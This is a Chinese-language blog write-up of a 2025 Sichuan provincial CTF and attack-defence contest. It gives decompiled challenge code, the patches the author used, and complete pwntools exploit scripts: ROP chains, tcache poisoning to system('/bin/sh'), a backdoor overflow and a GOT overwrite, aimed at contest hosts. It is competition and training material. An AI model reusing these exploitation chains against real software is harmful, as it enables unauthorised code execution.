@@ -1,0 +1,708 @@
+export const layout = "#components/Page.js";
+export const title = "2025 年四川省省赛 Writeup";
+export const description = "2025 年四川省省赛 CTF 与 AWDP 题解";
+export const created = "2025-10-27";
+
+# 2025 年四川省省赛 Writeup
+
+> 哦耶 😎 我们是冠军！
+
+四川省赛一般都是打两天，线下断网比赛，第一天 CTF jp 赛制，第二天就是 awdp，最终把两天归一化得分排名。
+
+这篇博客主要是记录一下 awdp 部分，因为平常 awdp 线下打的机会不是很多，每次赛前都会手忙脚乱地整理好久，感觉还是得好好记录一下。另外明年假如有学弟来打的话，感觉也可以方便他们。
+
+## Day1
+
+~~但是 CTF 赛制也是要简单记录一下的~~
+
+第一天的 JP 赛制的 Pwn 题真是纯💩，给我恶心坏了，我一共解出了两道 Pwn 题加一道逆向题。
+
+### Pwn
+
+#### wannaop
+
+VM Pwn，我基本上逐个函数还原了：
+
+```c
+__int64 __fastcall solve(__int64 vm, unsigned int op1, unsigned int op2)
+{
+  __int64 result; // rax
+  int v4; // [rsp+20h] [rbp-8h]
+  int v5; // [rsp+20h] [rbp-8h]
+  unsigned int v6; // [rsp+20h] [rbp-8h]
+  int v7; // [rsp+24h] [rbp-4h]
+  int v8; // [rsp+24h] [rbp-4h]
+  int v9; // [rsp+24h] [rbp-4h]
+
+  result = op1;
+  switch ( op1 )
+  {
+    case 0u:
+      push(vm, op2);
+      return 1;
+    case 1u:
+      pop(vm);
+      return 1;
+    case 2u:
+      v4 = pop(vm);
+      v7 = pop(vm);
+      push(vm, (unsigned int)(v7 + v4));
+      return 1;
+    case 3u:
+      v5 = pop(vm);
+      v8 = pop(vm);
+      push(vm, (unsigned int)(v5 - v8));
+      return 1;
+    case 4u:
+      v6 = pop(vm);
+      v9 = pop(vm);
+      push(vm, v9 ^ v6);
+      return 1;
+    case 5u:
+      return result;
+    case 6u:
+      store(vm, op2);
+      return 1;
+    case 7u:
+      return 0;
+    default:
+      puts("err opcode!");
+      return 1;
+  }
+}
+
+__int64 __fastcall pop(vm *a1)
+{
+  int sp; // eax
+
+  if ( a1->sp < 0 )
+  {
+    puts("error!");
+    return 0;
+  }
+  else
+  {
+    sp = a1->sp;
+    a1->sp = sp - 1;
+    return *(unsigned int *)&a1->stack[4 * sp];
+  }
+}
+
+int __fastcall push(vm *a1, int a2)
+{
+  int result; // eax
+
+  if ( a1->sp > 343 )
+    return puts("error!");
+  ++a1->sp;
+  result = (int)a1;
+  *(_DWORD *)&a1->stack[4 * a1->sp] = a2;       // stack overflow
+  return result;
+}
+```
+
+其实一开始比较好想到的是 `push` 操作可以溢出，正数溢出甚至可以改到 `sp` 指针，然后把 `sp` 改到负数，就可以控制执行流，当然直接正向溢出也可以。
+
+但是比较蛋疼的是题目提供的操作看反汇编，会感觉题目没给任何的 leak 操作，but 你会发现程序的 bss 段上有个 `%d`，交叉引用一下发现功能 5 里藏了一个 `printf`，可以用来泄露。。。
+
+```
+.text:00000000000015C4 loc_15C4:                               ; CODE XREF: solve+41↑j
+.text:00000000000015C4                                         ; DATA XREF: .rodata:jpt_14F2↓o
+.text:00000000000015C4                 call    $+5             ; jumptable 00000000000014F2 case 5
+.text:00000000000015C9                 lea     r8, loc_15D5
+.text:00000000000015D0                 mov     [rsp+28h+var_28], r8
+.text:00000000000015D4                 retn
+.text:00000000000015D5 ; ---------------------------------------------------------------------------
+.text:00000000000015D5
+.text:00000000000015D5 loc_15D5:                               ; DATA XREF: solve+118↑o
+.text:00000000000015D5                 cmp     [rbp+var_20], 0FFh
+.text:00000000000015DC                 jg      short loc_162F
+.text:00000000000015DE                 mov     rdx, [rbp+var_18]
+.text:00000000000015E2                 mov     eax, [rbp+var_20]
+.text:00000000000015E5                 cdqe
+.text:00000000000015E7                 movzx   eax, byte ptr [rdx+rax+404h]
+.text:00000000000015EF                 movzx   eax, al
+.text:00000000000015F2                 mov     esi, eax
+.text:00000000000015F4                 lea     rdi, aD         ; "%d\n"
+.text:00000000000015FB                 mov     eax, 0
+.text:0000000000001600                 call    _printf
+```
+
+emm 感觉有点逆天了，那就很简单了，泄漏地址然后利用题目给的任意写原语和栈溢出控制程序执行流，注意如果直接写 orw 长度会爆，所以先 reread，懒得栈迁移了。
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./wannaop"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("173.33.5.48", 9999) if argv[1] == 'r' else process(proc)
+libc = ELF("./libc.so.6")
+if args.G:
+    gdb.attach(io)
+
+
+def choose(idx):
+    io.sendlineafter(b"wanna op: ", str(idx).encode())
+
+
+def push(op):
+    choose(0)
+    if op == "-":
+        io.sendline(b"-")
+    else:
+        io.sendline(str(op).encode())
+
+
+def pop(op):
+    choose(1)
+    io.sendline(str(op).encode())
+
+
+def add():
+    choose(2)
+    io.sendline(b"0")
+
+
+def sub():
+    choose(3)
+    io.sendline(b"0")
+
+
+def xor():
+    choose(4)
+    io.sendline(b"0")
+
+
+def store(op):
+    choose(6)
+    io.sendline(str(op).encode())
+
+
+def ret():
+    choose(7)
+    io.sendline(b"0")
+
+
+def leak(op):
+    choose(5)
+    io.sendline(str(op).encode())
+    b = io.recvuntil(b"\n", drop=True).decode()
+    return int(b, 10)
+
+
+def write64(addr):
+    push(addr & 0xffffffff)
+    push((addr >> 32) & 0xffffffff)
+
+# vm: 0x7fffffffcb10
+# sp: 0x7fffffffd0e0
+
+
+res = b""
+for i in range(8):
+    res += p8(leak(-0x41c + i))
+pie_addr = u64(res) - 0x1734
+log.info(f"pie_addr => {hex(pie_addr)}")
+res = b""
+for i in range(8):
+    res += p8(leak(-0x41c + i - 8))
+stack_addr = u64(res)
+log.info(f"stack_addr => {hex(stack_addr)}")
+
+pop_rdi_ret = pie_addr + 0x00000000000017c3
+pop_rsi_ret = pie_addr + 0x00000000000017c1
+target_addr = stack_addr - 0x608
+puts_addr = pie_addr + 0x10f0
+main_addr = pie_addr + 0x1692
+for i in range(256):
+    push(0)
+
+push(0x145)
+write64(pop_rdi_ret)
+write64(target_addr)
+write64(puts_addr)
+write64(main_addr)
+
+ret()
+
+libc_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x63162
+log.info(f"libc_addr => {hex(libc_addr)}")
+
+pop_rsi_ret = libc_addr + 0x000000000002601f
+pop_rdx_ret = libc_addr + 0x000000000015fae6
+pop_rax_ret = libc_addr + 0x0000000000036174
+syscall = libc_addr + 0x00000000000630a9
+libc.address = libc_addr
+pop_rax_rdx_rbx_ret = libc_addr + 0x000000000015fae5
+for i in range(254):
+    push(0)
+
+push(0x616c662f)
+push(0x67)
+push(0x145)
+
+reread = [pop_rdi_ret, 0, pop_rsi_ret, stack_addr + 0x70, pop_rax_rdx_rbx_ret, 0, 0x300, 0, syscall]
+orw = [pop_rdi_ret, -100, pop_rsi_ret, stack_addr - 0xf8, pop_rdx_ret, 0, 0, pop_rax_ret, 257, syscall]
+orw += [pop_rdi_ret, 3, pop_rsi_ret, stack_addr + 0x400, pop_rdx_ret, 0x100, 0, pop_rax_ret, 0, syscall]
+orw += [pop_rdi_ret, 1, pop_rsi_ret, stack_addr + 0x400, pop_rdx_ret, 0x100, 0, pop_rax_ret, 1, syscall]
+orw = flat(orw)
+# print(res)
+
+for i in reread:
+    write64(i)
+ret()
+print(hex(stack_addr))
+io.sendline(orw)
+io.interactive()
+```
+
+比赛的时候发现不少人都卡在找到 leak 这一步，另外我打远程的时候忘了关代理导致调了半天以为是 exp 问题，给读者提个醒，线下打比赛务必关代理，哪怕平台能正常访问，也有可能某个靶机不能访问摆你一道。
+
+#### ezvm
+
+依然是 vm 题，，很逆天。比较倒霉的是我这个题忘了存 i64 了，所以这里就不仔细分析了。
+
+大概就是题目直接给人任意读和任意写的原语 `load` 和 `store`，但是它们都有一个关于最高符号位的 check，而这个符号位是在 load 立即数时设置的，也就是说如果想实现任意地址读写原语，得先解决这个符号位的问题。仔细分析一会可以发现，alu 操作族里的 `mul` 和 `div` 操作可以解决这个问题。然后就是实现这个原语，把 `puts@got` 改成 ogg 结束。
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./easyvm"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("173.33.5.3", 9999) if argv[1] == 'r' else process(proc)
+libc = ELF("./libc.so.6")
+
+if args.G:
+    gdb.attach(io, """
+    b *0x4022F3
+    """)
+
+
+def pack(op, reg1, reg2):
+    return p8(op) + p8(reg1) + b"\x00" * 2 + p64(reg2)
+
+
+def push(reg):
+    return pack(1, 0, reg & 0xff)
+
+
+def pop(reg):
+    return pack(2, reg & 0xff, 0)
+
+
+def mv_reg(reg1, reg2):
+    return pack(3, reg1 & 0xff, reg2 & 0xff)
+
+
+def load_reg(reg1, reg2):
+    return pack(4, reg1 & 0xff, reg2)
+
+
+def add(reg1, reg2):
+    return pack(5, reg1 & 0xff, reg2 & 0xff)
+
+
+def mul(reg1, reg2):
+    return pack(7, reg1 & 0xff, reg2 & 0xff)
+
+
+def div(reg1, reg2):
+    return pack(8, reg1 & 0xff, reg2 & 0xff)
+
+
+def load(reg1, reg2):
+    return pack(12, reg1 & 0xff, reg2 & 0xff)
+
+
+def store(reg2, reg1):
+    return pack(13, reg1 & 0xff, reg2 & 0xff)
+
+
+def readimm(target, zero_reg):
+    res = load_reg(1, target)
+    res += div(zero_reg, zero_reg)
+    res += mul(zero_reg, 1)
+    return res
+
+
+def read64(target, zero_reg):
+    res = readimm(target, zero_reg)
+    res += load(zero_reg, 1)
+    return res
+
+# def write32()
+# code: 0x4062d0 0x1800
+# mem: 0x407ae0 0x40
+# stack: 0x407b30 0x900
+# vm: 0x406290 0x20
+payload = b""
+payload += readimm(0x405028, 0)
+payload += load(3, 0)
+payload += readimm(0x7ffff7c00000 + 0xebd43 - 0x7ffff7c80e50, 2)
+payload += add(3, 2)
+payload += store(0, 3)
+
+io.sendlineafter(b"code:\n\t", payload)
+
+io.interactive()
+```
+
+我又犯病了，一开始拿到任意写原语之后，试了一个 ogg，发现打不通，就以为栈有问题打不了 ogg，然后去打 io 了，后来发现第一道题做的比我慢的这道题居然一血了才反应过来。。。应该全尝试一遍。
+
+#### hardllvm
+
+本场最 sb 的题目了，线下断网没环境，就嗯看。
+
+基本上都逆出来了，但是还是有一点结构没搞清楚，导致根本跑不了。
+
+hard 在哪
+
+总结：闹麻了，第一天这三道题要是不断网让 ai 做感觉用不了一个小时，，，好奇现在 ctf 出 vm pwn 的都是什么心理，尤其是这种毫无利用难度的。。。
+
+### Reverse
+
+别问我为什么会做逆向，太白给了。
+
+题目实现了一个 ida 的反调，但是 gdb 可以正常调。而题目的本体逻辑又很简单，就是一个异或加密。
+
+边吃饭就秒了。
+
+## Day2
+
+### awdp-fix
+
+四道题目，第一道题是个堆题，第一轮上来肯定是先 nop free，交了一发但是寄了
+
+```c
+int delete()
+{
+  char vars0; // [rsp+0h] [rbp+0h] BYREF
+  void *ptr; // [rsp+8h] [rbp+8h]
+  int vars10; // [rsp+10h] [rbp+10h]
+  unsigned __int64 vars18; // [rsp+18h] [rbp+18h]
+
+  vars18 = __readfsqword(0x28u);
+  __printf_chk(1, "Index: ");
+  read(0, &vars0, 0xFu);
+  if ( (unsigned int)strtol(&vars0, 0, 10) > 0x20 )
+    return puts("Invalid index!");
+  if ( !ptr )
+    return puts("Chunk not allocated!");
+  if ( vars10 )
+    return puts("Chunk already freed!");
+  free(ptr);
+  vars10 = 0;  // [1]
+  return puts("Chunk freed!");
+}
+```
+
+[1] 处装模作样清空了指针，但其实仔细看一下根本没有，修成把指针置为 0 就可以了。
+
+第二道题是个一个栈溢出：
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  _BYTE buf[48]; // [rsp+0h] [rbp-30h] BYREF
+
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  alarm(0x78u);
+  read(0, buf, 64u);  // [2]
+  gorun();
+  return 0;
+}
+```
+
+[2] 处有一个很显然的栈溢出，直接修复就可以了，我开赛五分钟就把这个交了，为什么是五分钟呢，因为前 4 分钟去 nop free 了哈哈。
+
+第三道题是一个 crypto pwn：
+
+```c
+int sub_401720()
+{
+  char src[256]; // [rsp+0h] [rbp-250h] BYREF
+  char s[256]; // [rsp+100h] [rbp-150h] BYREF
+  _BYTE dest[76]; // [rsp+200h] [rbp-50h] BYREF
+  int v4; // [rsp+24Ch] [rbp-4h]
+
+  printf("Enter Base64 encoded data: ");
+  fgets(s, 256, stdin);
+  s[strcspn(s, "\n")] = 0;
+  v4 = sub_40153B((__int64)s, (__int64)src);  // [3]
+  if ( v4 > 64 )
+    return printf("Invalid size");
+  memcpy(dest, src, v4);  // [4]
+  return puts("have a good time!");
+}
+
+int sub_4016FD()
+{
+  puts("Congratulations! You got the shell!");
+  return system("/bin/sh");  // [5]
+}
+```
+
+按理说这里肯定是 `v4` 有问题导致 `memcpy` 溢出，我一开始直接 patch 了 v4 为 0x40，但是过不了。
+
+稍微翻了一下函数表发现有个 backdoor，于是把 `system` patch 了，然而没有卵用，有点懵了，发现 `system` 的参数是 `"/bin/sh"`，于是把 `"/bin/sh"` patch 了，然后就过了。
+
+后面 break 的时候后知后觉，`sub_40153B` 这个函数可以返回负数，那就相当于整数溢出了。
+
+最后一个题是格式化字符串：
+
+```c
+__int64 __fastcall sub_2567(const char *a1, const char *a2)
+{
+  if ( !strcmp(a1, a2) )  // [6]
+  {
+    puts("Captcha correct!");
+    printf("Welcome:");
+    read(0, buf, 0x10u);
+    printf("Your greeting:");
+    puts(buf);
+  }
+  else
+  {
+    puts("Captcha wrong!");
+  }
+  putchar(10);
+  return 0;
+}
+```
+
+题目 got 表可写，应该是有什么办法可以实现任意写把 `puts` 改成 `printf`，但是我比赛时太急了，没看到怎么实现的，所以就直接把 [6] 的 `jnz` patch 成 `jz` 了，一遍过，笑死了。
+
+
+到这基本上不到 2h 就 fix 结束了，美美吃分。
+
+然后开始 attack
+
+### awdp-attack
+
+上来先看的堆题，白给的 double free，但是没有 edit，只要搞一个 uaf 转 chunk overlap 就可以打 tcache posioning 了，稍微看了下笔记，house of botcake + 堆风水比较适合，照着笔记里的板子打了。
+
+实现了一个 0x250 的 chunk victimB 和 4 个 0x80 的 chunk 重叠的效果，然后打 tcache posioning 通过 environ 打栈就结束了。
+
+一血，比赛结束时这个题吃了 1700 分+，太爽了。
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./heap"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("173.33.5.38", 9999) if argv[1] == 'r' else process(proc)
+libc = ELF("./libc.so.6")
+
+if args.G:
+    gdb.attach(io)
+
+
+def choose(idx):
+    io.sendlineafter(b"> ", str(idx).encode())
+
+
+def create(idx, size, content):
+    choose(1)
+    io.sendlineafter(b"Index: ", str(idx).encode())
+    io.sendlineafter(b"Size: ", str(size).encode())
+    io.sendlineafter(b"Data: ", content)
+
+
+def show(idx):
+    choose(2)
+    io.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def delete(idx):
+    choose(3)
+    io.sendlineafter(b"Index: ", str(idx).encode())
+
+
+for i in range(7):
+    create(i, 0x80, b"aaaa")
+create(7, 0x80, b"victim1")
+create(8, 0x80, b"victim2")
+create(20, 0x80, b"gap")
+create(21, 0x80, b"gap")
+create(22, 0x80, b"gap")
+create(23, 0x80, b"gap")
+create(24, 0x20, b"gap")
+
+for i in range(9):
+    delete(i)
+show(0)
+io.recvuntil(b"Data: ")
+heap_base = u64(io.recv(5).ljust(8, b"\x00")) << 12
+log.info(f"heap_base => {hex(heap_base)}")
+io.recv(3)
+cookie = u64(io.recv(8))
+log.info(f"cookie => {hex(cookie)}")
+
+show(7)
+io.recvuntil(b"Data: ")
+libc_addr = u64(io.recv(8)) - 0x21ace0
+log.info(f"libc_addr => {hex(libc_addr)}")
+
+# house of botcake 的失败尝试，没有 edit 做了相同大小的堆块重叠也没用
+# create(9, 0x80, b"gap")
+# delete(8)
+# create(10, 0x30, b"gap0")
+# create(11, 0x40, b"gap1")
+# create(12, 0x30, b"gap2")
+# create(13, 0x40, b"gap3")
+
+environ = libc_addr + 0x222200
+create(18, 0x80, b"a")
+create(19, 0x80, b"a")
+create(9, 0x100, b"A" * 0x88 + p64(0x250))
+delete(8)
+delete(20)
+create(10, 0x240, b"A" * 0x88 + p64(0x90) + p64(environ - 0x10 ^ (heap_base >> 12)) + p64(cookie))
+create(11, 0x80, b"")
+create(12, 0x80, b"")
+show(12)
+io.recvuntil(b": ")
+io.recv(16)
+stack_addr = u64(io.recv(8))
+log.info(f"stack_addr => {hex(stack_addr)}")
+
+delete(20)
+delete(10)
+create(13, 0x240, b"A" * 0x88 + p64(0x90) + p64(stack_addr - 0x168 ^ (heap_base >> 12)) + p64(cookie))
+create(14, 0x80, b"")
+# pause()
+
+pop_rdi_ret = libc_addr + 0x000000000002a3e5
+ret = libc_addr + 0x00000000000f4119
+system = libc.sym["system"] + libc_addr
+binsh = libc_addr + next(libc.search(b"/bin/sh\x00"))
+payload = flat([pop_rdi_ret, binsh, ret, system])
+create(15, 0x80, b"aaaabbbb" + payload)
+
+io.interactive()
+```
+
+然后就去看那个 crypto pwn 了，难点主要在两个加密算法的复现上，找队里的 crypto 师傅复现了一下。
+
+复现的有点费劲，逆向的也有点费劲，但是还是成功了qwq
+
+如 fix 所说题目有 backdoor，控制执行流就行。
+
+```python
+from pwn import *
+from sys import argv
+import base64
+from Crypto.Util.number import long_to_bytes
+
+proc = "./challenge"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("173.33.5.40", 9999) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io)
+
+s='abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+# h=process("/home/l0fxxs/ctf/game/shemsai/mycode/challenge")
+def decode(input):
+    n0=s.find(input[0])
+    n1=s.find(input[1])
+    n2=s.find(input[2])
+    n3=s.find(input[3])
+    print(n0,n1,n2,n3)
+    v3_0_6=n3
+    v3_6_8=n2%(2**2)
+    v3=v3_0_6+(v3_6_8<<6)
+    v2_0_4=n2>>2
+    v2_4_8=n1%(2**4)
+    v2=v2_0_4+(v2_4_8<<4)
+    v1_0_2=n1>>4
+    v1_2_8=n0
+    v1=v1_0_2+(v1_2_8<<2)
+    print(v1,v2,v3)
+    return long_to_bytes((v1<<16)+(v2<<8)+v3)
+
+def decode1(b):
+    # ret=[]
+    ret = ""
+    for i in range(len(b)//3):
+        a1=(b[3*i])
+        a2=(b[3*i+1])
+        a3=(b[3*i+2])
+        print(a1,a2,a3)
+        v3=a3&0b111111
+        v2=((a3>>6)+(((a2&0b111111))<<2))&0b111111
+
+        v1=((a2>>4)+((a1&3)<<4))&0b111111
+        v0=(a1>>2)&0b111111
+        ret+= s[v0] + s[v1] + s[v2] + s[v3]
+        print((ret).encode())
+    return (ret).encode()
+
+io.recvuntil(b": ")
+res = decode(io.recvuntil(b"\n", drop=True).decode())
+io.sendlineafter(b"> ", res)
+
+backdoor = 0x401711
+payload = b"qAqAbbbb" + decode1((b"\x00" + p64(backdoor)) * 32)
+io.sendline(payload)
+io.interactive()
+```
+
+上面这个题费太久时间了，这种政治比赛时间本来就短，做到这个 noleak 栈溢出时时间已经不太够了。
+
+于是成功犯病了，具体情况是，用 ROPgadget 能看到下面这两条 gadget：
+
+```
+0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret  // [7]
+0x000000000040121c : pop rbx ; ret
+```
+
+很经典的 magic gadget 了，相当于给了任意地址加的原语，but 我比赛时只想起来用 ropper 了，而 ropper 找不到 [7] 这条链子。。。。
+
+然后我就只能纯风水打，，究极折磨。
+
+~~预期的话应该是，先栈迁移到 bss 上，然后 `call _start` 在 bss 上布置 libc，通过任意加原语搞一个 ogg 出来拿下。~~
+
+复现了一下发现压根没必要 `call _start`，直接用 bss 上 `stdin` 就能搞出来一个 ogg。
+
+哎哎，我不是人。
+
+于是最后一道格式化串时间彻底不够了，通过数组越界可以实现劫持 got，然后把 `puts` 劫持成 `printf`，转成堆上的格式化字符串，有三次，可以操作出无限次，然后没时间了。。
+
+
+**总结**：五个小时的比赛，又要打又要防，其实如果不在栈上 stuck 完全能出。
+
+
+## 经验
+
+首先打断网线下赛，一定要保证环境，多跟队友交流，比赛前把环境测试好，以免出现比赛时发现 python 起不了 http.server 且没有 U 盘的情况。
+
+提前把各个版本的 libc-dbg.deb 包都下好，以免遇到题目想带源码调试 IOFILE 时抓瞎。
+
+比赛前把板子什么的准备好，平常就可以多积累，比赛时争分夺秒的环境下不一定有时间慢慢堆风水，这个时候提前准备好的可以直接套用的风水 trick 就派上大用场了。
+
+另外学会灵活用 patchelf，很多时候出题人给的 ld 并不是很好用，patch 了 libc 后可以根据 libc 的版本来选择大版本一致小版本有一点不一样的 ld 来打，也可以用 [docker env](https://hub.docker.com/r/roderickchan/debug_pwn_env/tags)。
+
+再就是可以使用联网功能，比如 gdb 的 debuginfod 服务器 和 pwninit 这种工具，但是要知道怎么关/代替，不然断网的时候每次调试前都得等待 web 访问超时太折磨了。
+
+
+技术层面的：
+
+1. ogg 真得一个一个尝试
+2. ropper + ROPgadget
+
+其实这种政治比赛一般没有特别难的题目，基本上就是随便打，前提是保证熟练度 + 少犯错。
+
+最后说一句我们是冠军，四川省赛 pwn 还是太 1z 了。
